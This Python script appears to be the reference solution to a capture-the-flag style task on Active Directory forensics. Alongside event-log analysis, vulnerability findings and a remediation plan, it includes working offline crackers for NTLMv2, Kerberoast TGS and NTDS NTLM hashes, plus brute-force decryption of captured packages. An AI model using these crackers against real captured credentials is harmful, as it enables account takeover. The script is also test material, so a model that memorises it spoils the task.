#!/usr/bin/env python3
"""Solution: AD attack path forensic assessment via Python-based analysis."""

import json
import os
import re
import struct
import hmac as hmac_mod

from Crypto.Hash import MD4
from Crypto.Cipher import ARC4, AES
from Crypto.Protocol.KDF import PBKDF2


# ── Crypto helpers ─────────────────────────────────────────


def ntlm_hash(password):
    return MD4.new(password.encode("utf-16-le")).digest()


def ntlm_hash_hex(password):
    return ntlm_hash(password).hex()


def load_wordlist(path):
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


# ── NTLMv2 cracker ────────────────────────────────────────


def parse_ntlmv2_line(line):
    idx = line.index("::")
    username = line[:idx]
    rest = line[idx + 2:]
    parts = rest.split(":")
    if len(parts) < 4:
        return None
    domain = parts[0]
    server_challenge = bytes.fromhex(parts[1])
    nt_proof_str = bytes.fromhex(parts[2])
    blob = bytes.fromhex(parts[3])
    return username, domain, server_challenge, nt_proof_str, blob


def crack_ntlmv2(hash_lines, wordlist):
    results = {}
    entries = []
    for line in hash_lines:
        line = line.strip()
        if not line or "::" not in line:
            continue
        parsed = parse_ntlmv2_line(line)
        if parsed:
            entries.append(parsed)

    for password in wordlist:
        nt_hash = ntlm_hash(password)
        for username, domain, sc, expected, blob in entries:
            if username in results:
                continue
            identity = (username.upper() + domain.upper()).encode("utf-16-le")
            ntv2 = hmac_mod.new(nt_hash, identity, "md5").digest()
            computed = hmac_mod.new(ntv2, sc + blob, "md5").digest()
            if computed == expected:
                results[username] = password
                print(f"    [+] NTLMv2 cracked: {username} -> {password}")

    return results


# ── Kerberos TGS cracker ──────────────────────────────────

TGS_RE = re.compile(
    r"^\$krb5tgs\$23\$\*([^$]+)\$([^$]+)\$([^*]+)\*\$([0-9a-f]{32})\$([0-9a-f]+)$",
    re.IGNORECASE,
)


def crack_krb5tgs(hash_lines, wordlist):
    results = {}
    entries = []
    for line in hash_lines:
        line = line.strip()
        m = TGS_RE.match(line)
        if not m:
            continue
        username = m.group(1)
        checksum = bytes.fromhex(m.group(4))
        encrypted = bytes.fromhex(m.group(5))
        entries.append((username, checksum, encrypted))

    usage = struct.pack("<I", 2)
    for password in wordlist:
        key = ntlm_hash(password)
        k1 = hmac_mod.new(key, usage, "md5").digest()
        for username, checksum, encrypted in entries:
            if username in results:
                continue
            k2 = hmac_mod.new(k1, checksum, "md5").digest()
            cipher = ARC4.new(k2)
            decrypted = cipher.decrypt(encrypted)
            computed = hmac_mod.new(k1, decrypted, "md5").digest()
            if computed == checksum:
                results[username] = password
                print(f"    [+] TGS cracked: {username} -> {password}")

    return results


# ── NTLM cracker (lookup table) ───────────────────────────


def crack_ntlm(ntds_lines, wordlist):
    hash_lookup = {}
    for password in wordlist:
        h = ntlm_hash(password).hex().lower()
        hash_lookup[h] = password

    results = {}
    for line in ntds_lines:
        line = line.strip()
        if not line:
            continue
        parts = line.split(":")
        if len(parts) < 4:
            continue
        username = parts[0].split("\\")[-1]
        nt_hex = parts[3].lower()
        if nt_hex in hash_lookup:
            results[username] = hash_lookup[nt_hex]
            print(f"    [+] NTLM cracked: {username} -> {hash_lookup[nt_hex]}")

    return results


# ── AES-256-GCM decrypt ──────────────────────────────────


def aes_decrypt(encrypted_path, password):
    """Attempt to decrypt AES-256-GCM encrypted file.

    Format: salt(16) || nonce(12) || tag(16) || ciphertext
    Key: PBKDF2(password, salt, dkLen=32, count=100000)

    Returns plaintext string on success, None on failure.
    """
    with open(encrypted_path, "rb") as f:
        data = f.read()
    if len(data) < 44:  # 16 + 12 + 16 minimum header
        return None
    salt = data[:16]
    nonce = data[16:28]
    tag = data[28:44]
    ciphertext = data[44:]
    key = PBKDF2(password, salt, dkLen=32, count=100000)
    aes_cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    try:
        plaintext = aes_cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.decode("utf-8")
    except (ValueError, UnicodeDecodeError):
        return None


def try_decrypt_all(enc_files, credentials):
    """Try all credentials against all encrypted files.

    Returns {basename: (user, password, content)}.
    """
    decrypted = {}
    for enc_file in enc_files:
        basename = os.path.basename(enc_file)
        if basename in decrypted:
            continue
        for user, pwd in credentials.items():
            content = aes_decrypt(enc_file, pwd)
            if content is not None:
                decrypted[basename] = (user, pwd, content)
                print(f"    [+] {basename} decrypted with {user}'s password")
                break
    return decrypted


# ── Event log analysis ─────────────────────────────────────


def analyze_events(events):
    """Analyze security events to build hypothesis justification."""
    attacker_ip = "10.10.10.50"
    scanner_ip = "10.10.10.100"

    # Categorize events
    scanner_events = [e for e in events
                      if e.get("EventData", {}).get("IpAddress") == scanner_ip]
    attacker_kerb = [e for e in events
                     if e["EventID"] == 4769
                     and e.get("EventData", {}).get("TicketEncryptionType") == "0x17"]
    dcsync_events = [e for e in events
                     if e["EventID"] == 4662
                     and "Replication" in str(e.get("EventData", {}).get("Properties", ""))]

    justification_parts = [
        f"Hypothesis A is correct based on event log correlation. ",
        f"Events from 10.10.10.100 (scanner IP) show {len(scanner_events)} failed logons "
        f"against generic/non-existent accounts (admin, sa, root, test) — consistent with "
        f"automated vulnerability scanner, not a targeted attacker. ",
        f"The actual attack originated from {attacker_ip} (WS001): "
        f"Event ID 4776 entries show NTLM credential validation for jsmith, bwilson, agarcia "
        f"via LLMNR/Responder poisoning. ",
        f"Event ID 4769 entries show {len(attacker_kerb)} rapid TGS requests with RC4 "
        f"encryption (etype 0x17) from {attacker_ip} — classic Kerberoasting signature. ",
        f"Event ID 4662 entries show svc_backup performing DCSync (DS-Replication-Get-Changes) "
        f"against DC=acme,DC=corp — NTDS extraction via replication rights, not volume shadow copy. ",
        f"Event ID 4624 shows da_johnson logon from {attacker_ip} after NTDS extraction, "
        f"confirming the credential chain: LLMNR capture -> Kerberoast -> DCSync -> DA compromise.",
    ]

    return " ".join(justification_parts)


# ── Vulnerability assessment ───────────────────────────────


def build_vulnerability_assessment(ad_config):
    """Analyze AD config to identify security misconfigurations."""
    vulns = []

    # VULN-1: LLMNR/NBT-NS enabled
    gpo = ad_config.get("gpo_security_settings", {}).get("Default Domain Policy", {})
    if gpo.get("LLMNR") == "Not Configured":
        vulns.append({
            "id": "VULN-1",
            "title": "LLMNR and NBT-NS Name Resolution Not Disabled",
            "severity": "high",
            "cvss_base_score": 7.5,
            "misconfiguration": "GPO 'Default Domain Policy' has LLMNR set to 'Not Configured' "
                                "(enabled by default), allowing LLMNR/NBT-NS poisoning attacks "
                                "on the network for credential interception via tools like Responder.",
            "attack_stage_enabled": 1,
            "remediation": "Disable LLMNR via GPO (Computer Configuration > Administrative Templates > "
                           "Network > DNS Client > Turn Off Multicast Name Resolution = Enabled) and "
                           "disable NBT-NS on all network interfaces.",
        })

    # VULN-2: RC4 Kerberos encryption
    kerb = ad_config.get("kerberos_policy", {})
    etypes = kerb.get("supported_encryption_types", [])
    if any("RC4" in e for e in etypes):
        vulns.append({
            "id": "VULN-2",
            "title": "RC4-HMAC-MD5 Kerberos Encryption Still Supported",
            "severity": "high",
            "cvss_base_score": 7.2,
            "misconfiguration": "Kerberos policy includes RC4-HMAC-MD5 in supported encryption types. "
                                "RC4-encrypted TGS tickets are vulnerable to offline brute-force "
                                "cracking (Kerberoasting). All service accounts with SPNs are exposed.",
            "attack_stage_enabled": 2,
            "remediation": "Remove RC4-HMAC-MD5 from supported Kerberos encryption types via GPO. "
                           "Ensure all service accounts and systems support AES encryption before removal.",
        })

    # VULN-3: Non-managed service accounts with weak passwords
    svc_accounts = ad_config.get("service_accounts", {})
    non_managed = [name for name, info in svc_accounts.items()
                   if not info.get("managed_service_account") and info.get("password_never_expires")]
    if non_managed:
        vulns.append({
            "id": "VULN-3",
            "title": "Non-Managed Service Accounts with Static Passwords",
            "severity": "high",
            "cvss_base_score": 7.0,
            "misconfiguration": f"Service accounts {', '.join(non_managed)} are not using Group Managed "
                                f"Service Accounts (gMSA). Passwords are set to never expire with last "
                                f"rotation dates ranging from June 2023 to March 2024. Combined with "
                                f"RC4 support, these accounts are prime Kerberoasting targets.",
            "attack_stage_enabled": 2,
            "remediation": "Migrate service accounts to Group Managed Service Accounts (gMSA) where "
                           "possible. For accounts that cannot use gMSA, enforce 30-character minimum "
                           "randomly-generated passwords with 90-day rotation.",
        })

    # VULN-4: svc_backup in Backup Operators
    svc_backup = svc_accounts.get("svc_backup", {})
    if "Backup Operators" in svc_backup.get("member_of", []):
        vulns.append({
            "id": "VULN-4",
            "title": "Service Account with Excessive Backup Operators Privileges",
            "severity": "critical",
            "cvss_base_score": 8.8,
            "misconfiguration": "svc_backup is a member of the Backup Operators group, which grants "
                                "implicit DCSync-equivalent access through backup/restore privileges. "
                                "Combined with a Kerberoastable SPN and weak password, compromising "
                                "this single account enables full domain hash extraction.",
            "attack_stage_enabled": 3,
            "remediation": "Remove svc_backup from Backup Operators. Implement dedicated backup "
                           "solution with least-privilege access. If backup operator rights are "
                           "required, use a gMSA with strong password and restrict logon scope.",
        })

    # VULN-5: Domain admin not in Protected Users
    priv_accounts = ad_config.get("privileged_accounts", {})
    unprotected = [name for name, info in priv_accounts.items()
                   if not info.get("protected_users_member")]
    if unprotected:
        vulns.append({
            "id": "VULN-5",
            "title": "Domain Admin Accounts Not in Protected Users Group",
            "severity": "high",
            "cvss_base_score": 7.5,
            "misconfiguration": f"Privileged accounts {', '.join(unprotected)} are not members of "
                                f"the Protected Users security group. This allows NTLM authentication, "
                                f"credential caching, and Kerberos delegation for these accounts, "
                                f"increasing the impact of credential theft.",
            "attack_stage_enabled": 4,
            "remediation": "Add all domain admin accounts to the Protected Users group. This "
                           "enforces Kerberos-only authentication, prevents credential caching, "
                           "and disables delegation for these accounts.",
        })

    # VULN-6: No tiered administration
    tiered = ad_config.get("tiered_administration", {})
    if not tiered.get("implemented"):
        vulns.append({
            "id": "VULN-6",
            "title": "No Tiered Administration or Privileged Access Workstations",
            "severity": "critical",
            "cvss_base_score": 9.0,
            "misconfiguration": "No tiered administration model is implemented. Domain admin accounts "
                                "have unrestricted logon workstation access (da_johnson, Administrator). "
                                "No Privileged Access Workstations (PAW) are deployed. Domain admin "
                                "credentials can be used from any workstation, enabling pass-the-hash "
                                "and credential theft from standard endpoints.",
            "attack_stage_enabled": 4,
            "remediation": "Implement Microsoft's tiered administration model with three tiers. "
                           "Deploy Privileged Access Workstations for Tier 0 (domain) administration. "
                           "Restrict DA logon to PAWs only via GPO logon restrictions.",
        })

    # VULN-7: Unconstrained delegation on svc_web
    delegation = ad_config.get("delegation_settings", [])
    unconstrained = [d for d in delegation if d.get("delegation_type") == "Unconstrained"]
    if unconstrained:
        vulns.append({
            "id": "VULN-7",
            "title": "Unconstrained Kerberos Delegation on Service Account",
            "severity": "critical",
            "cvss_base_score": 8.5,
            "misconfiguration": f"svc_web is configured with unconstrained Kerberos delegation. "
                                f"Any user authenticating to WEBSVR01 will have their TGT cached, "
                                f"allowing the service (or anyone who compromises it) to impersonate "
                                f"them to any service in the domain, including domain controllers.",
            "attack_stage_enabled": 0,
            "remediation": "Replace unconstrained delegation with constrained delegation or "
                           "resource-based constrained delegation (RBCD). If the web application "
                           "requires delegation, configure it with specific target SPNs only.",
        })

    # VULN-8: Disabled auditing
    if gpo.get("PowerShell_ScriptBlock_Logging") == "Disabled":
        vulns.append({
            "id": "VULN-8",
            "title": "PowerShell and Command Line Auditing Disabled",
            "severity": "medium",
            "cvss_base_score": 5.0,
            "misconfiguration": "PowerShell ScriptBlock Logging, Module Logging, and Process Creation "
                                "Command Line auditing are all disabled. This severely limits forensic "
                                "visibility and ability to detect/investigate attacks post-compromise.",
            "attack_stage_enabled": 0,
            "remediation": "Enable PowerShell ScriptBlock Logging, Module Logging, and Process "
                           "Creation auditing with command line capture via GPO. Forward logs to SIEM.",
        })

    return vulns


# ── Remediation plan ───────────────────────────────────────


def build_remediation_plan(vulns):
    """Build prioritized remediation plan with operational dependencies."""
    plan = [
        {
            "priority": 1,
            "action": "Identify and inventory all compromised accounts by correlating "
                      "cracked credentials with the NTDS dump and event logs. Document "
                      "the full scope of compromise before taking remedial action.",
            "addresses": ["VULN-4", "VULN-5"],
            "depends_on": [],
        },
        {
            "priority": 2,
            "action": "Disable LLMNR via GPO (Turn Off Multicast Name Resolution = Enabled) "
                      "and disable NBT-NS on all network interfaces to prevent further "
                      "credential interception.",
            "addresses": ["VULN-1"],
            "depends_on": [],
        },
        {
            "priority": 3,
            "action": "Remove unconstrained Kerberos delegation from svc_web and configure "
                      "constrained delegation with specific target SPNs. Invalidate any "
                      "cached TGTs on WEBSVR01.",
            "addresses": ["VULN-7"],
            "depends_on": [],
        },
        {
            "priority": 4,
            "action": "Migrate service accounts (svc_backup, svc_web, svc_exchange) to "
                      "Group Managed Service Accounts (gMSA) with automatic password rotation. "
                      "Remove svc_backup from Backup Operators group and implement least-privilege "
                      "backup solution.",
            "addresses": ["VULN-3", "VULN-4"],
            "depends_on": ["Identify all compromised accounts"],
        },
        {
            "priority": 5,
            "action": "Rotate all compromised account passwords (including da_johnson, "
                      "Administrator, all service accounts, and all domain users identified "
                      "in the NTDS dump). Perform krbtgt password reset (twice, with 12-hour "
                      "interval) to invalidate all existing Kerberos tickets.",
            "addresses": ["VULN-3", "VULN-5"],
            "depends_on": ["Migrate service accounts to gMSA", "Identify all compromised accounts"],
        },
        {
            "priority": 6,
            "action": "Remove RC4-HMAC-MD5 from supported Kerberos encryption types. "
                      "Verify all systems and applications support AES encryption. "
                      "This must follow service account migration to prevent service disruption.",
            "addresses": ["VULN-2"],
            "depends_on": ["Migrate service accounts to gMSA"],
        },
        {
            "priority": 7,
            "action": "Implement tiered administration model. Deploy Privileged Access "
                      "Workstations (PAW) for Tier 0 administration. Add all domain admin "
                      "accounts to Protected Users group. Restrict DA logon to PAWs via GPO.",
            "addresses": ["VULN-5", "VULN-6"],
            "depends_on": ["Rotate all compromised credentials"],
        },
        {
            "priority": 8,
            "action": "Enable PowerShell ScriptBlock Logging, Module Logging, and Process "
                      "Creation command line auditing via GPO. Configure SIEM forwarding for "
                      "Security, PowerShell, and Sysmon event channels.",
            "addresses": ["VULN-8"],
            "depends_on": [],
        },
    ]
    return plan


# ── Main ───────────────────────────────────────────────────


def main():
    os.chdir("/app")
    all_creds = {}
    wordlist = load_wordlist("/app/wordlist.txt")

    # ── Stage 1: Responder NTLMv2 hashes ──
    print("[*] Stage 1: Cracking NTLMv2 from Responder logs...")
    ntlmv2_lines = []
    for fname in os.listdir("/app/responder"):
        with open(f"/app/responder/{fname}") as f:
            ntlmv2_lines.extend(f.readlines())

    cracked = crack_ntlmv2(ntlmv2_lines, wordlist)
    all_creds.update(cracked)

    # ── Stage 2: Kerberoast TGS hashes ──
    print("[*] Stage 2: Filtering & cracking Kerberoast hashes...")
    with open("/app/loot/kerberoast_raw.txt") as f:
        kerb_lines = f.readlines()

    cracked = crack_krb5tgs(kerb_lines, wordlist)
    all_creds.update(cracked)

    # ── Stage 3: Try all cracked credentials against encrypted packages ──
    print("[*] Stage 3: Probing encrypted packages with recovered credentials...")
    enc_files = [
        "/app/loot/package_alpha.enc",
        "/app/loot/package_beta.enc",
        "/app/loot/package_gamma.enc",
        "/app/loot/package_delta.enc",
    ]
    decrypted_round1 = try_decrypt_all(enc_files, all_creds)

    # ── Stage 4: Identify and crack NTDS dump from decrypted packages ──
    print("[*] Stage 4: Searching decrypted packages for NTDS dump...")
    ntds_content = None
    for basename, (user, pwd, content) in decrypted_round1.items():
        # NTDS dump lines match: domain\user:rid:lm:nt:::
        if ":::" in content and "aad3b435b51404ee" in content:
            print(f"    [+] Found NTDS dump in {basename}")
            ntds_content = content
            break

    assert ntds_content, "Could not find NTDS dump in any decrypted package"

    print("[*] Stage 5: Cracking NTLM hashes from NTDS dump...")
    ntds_lines = ntds_content.strip().split("\n")
    cracked = crack_ntlm(ntds_lines, wordlist)
    all_creds.update(cracked)

    # ── Stage 6: Try new credentials against remaining encrypted packages ──
    print("[*] Stage 6: Probing remaining packages with new credentials...")
    remaining_enc = [f for f in enc_files
                     if os.path.basename(f) not in decrypted_round1]
    decrypted_round2 = try_decrypt_all(remaining_enc, all_creds)
    all_decrypted = {**decrypted_round1, **decrypted_round2}

    # ── Stage 7: Find the objective (crown jewels) ──
    print("[*] Stage 7: Identifying final objective...")
    objective = None
    for basename, (user, pwd, content) in all_decrypted.items():
        if "ACME{" in content or "AKIAIOSFODNN7EXAMPLE" in content:
            print(f"    [+] Found objective in {basename}")
            objective = content
            break

    assert objective, "Could not find objective in any decrypted package"

    # ── Stage 8: Analyze event logs ──
    print("[*] Stage 8: Analyzing security event logs...")
    with open("/app/security_events.json") as f:
        events = json.load(f)

    hypothesis_justification = analyze_events(events)

    # ── Stage 9: Build vulnerability assessment from AD config ──
    print("[*] Stage 9: Building vulnerability assessment from AD configuration...")
    with open("/app/ad_config.json") as f:
        ad_config = json.load(f)

    vulnerability_assessment = build_vulnerability_assessment(ad_config)

    # ── Stage 10: Build remediation plan ──
    print("[*] Stage 10: Building prioritized remediation plan...")
    remediation_plan = build_remediation_plan(vulnerability_assessment)

    # ── Build results ──
    da_pwd = all_creds.get("da_johnson")
    assert da_pwd, "da_johnson not cracked"

    print("[*] Writing results.json...")
    results = {
        "all_credentials": all_creds,
        "selected_hypothesis": "A",
        "hypothesis_justification": hypothesis_justification,
        "attack_chain": [
            {
                "stage": 1,
                "technique": "LLMNR/NBT-NS Poisoning via Responder",
                "account": "jsmith",
                "credential_type": "NTLMv2",
                "evidence": "Event ID 4776 — NTLM credential validation for jsmith, bwilson, "
                            "agarcia from WS001/WEBSVR01 at 09:15 UTC. Responder capture files "
                            "in responder/ directory corroborate NTLMv2 interception.",
                "next_step": "Domain user access for Kerberoasting",
            },
            {
                "stage": 2,
                "technique": "Kerberoasting (GetUserSPNs / TGS Request with RC4)",
                "account": "svc_backup",
                "credential_type": "Kerberos TGS (RC4-HMAC)",
                "evidence": "Event ID 4769 — Three rapid TGS requests with TicketEncryptionType "
                            "0x17 (RC4) from 10.10.10.50 at 10:32 UTC, targeting svc_backup, "
                            "svc_web, svc_mssql service accounts. Kerberoast output in "
                            "loot/kerberoast_raw.txt.",
                "next_step": "Backup Operators privileges enable NTDS extraction",
            },
            {
                "stage": 3,
                "technique": "DCSync / NTDS Extraction via Replication Rights",
                "account": "svc_backup",
                "credential_type": "Kerberos TGS (cracked) / Backup Operators membership",
                "evidence": "Event ID 4662 — svc_backup accessed DS-Replication-Get-Changes and "
                            "DS-Replication-Get-Changes-All on DC=acme,DC=corp at 14:22 UTC from "
                            "10.10.10.50. This is DCSync, not volume shadow copy (refutes Hypothesis B).",
                "next_step": "Crack domain admin NTLM hash from NTDS dump",
            },
            {
                "stage": 4,
                "technique": "Domain Admin Credential Cracking from NTDS Dump",
                "account": "da_johnson",
                "credential_type": "NTLM (from NTDS.dit)",
                "evidence": "Event ID 4624 — da_johnson logon from 10.10.10.50 at 15:45 UTC, "
                            "followed by Event ID 4672 privileged operation. NTDS dump in "
                            "decrypted package_alpha.enc contained da_johnson's NTLM hash.",
                "next_step": "Full domain compromise — access crown jewels",
            },
        ],
        "vulnerability_assessment": vulnerability_assessment,
        "remediation_plan": remediation_plan,
        "domain_admin": {
            "username": "da_johnson",
            "password": da_pwd,
            "ntlm_hash": ntlm_hash_hex(da_pwd),
        },
        "objective": objective,
    }

    with open("/app/results.json", "w") as f:
        json.dump(results, f, indent=2)

    print(f"[*] Done — {len(all_creds)} credentials recovered.")
    print(f"[*] {len(vulnerability_assessment)} vulnerabilities identified.")
    print(f"[*] {len(remediation_plan)} remediation actions planned.")


if __name__ == "__main__":
    main()
